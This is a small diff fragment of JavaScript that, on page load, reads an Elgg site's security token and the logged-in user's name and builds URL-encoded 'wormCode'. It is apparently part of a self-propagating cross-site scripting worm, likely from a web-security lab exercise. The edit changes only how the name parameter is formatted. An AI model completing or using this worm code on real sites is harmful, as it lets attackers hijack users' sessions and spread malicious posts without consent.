@@ -11,7 +11,7 @@ window.onload = function(){
 	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
         var tokenc = "__elgg_token=" + elgg.security.token.__elgg_token;
 	var name = "&name=" + elgg.session.user.name;
-        var namec = elgg.session.user.name;
+        var namec = "name=" + elgg.session.user.name;
 	
 	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
 	
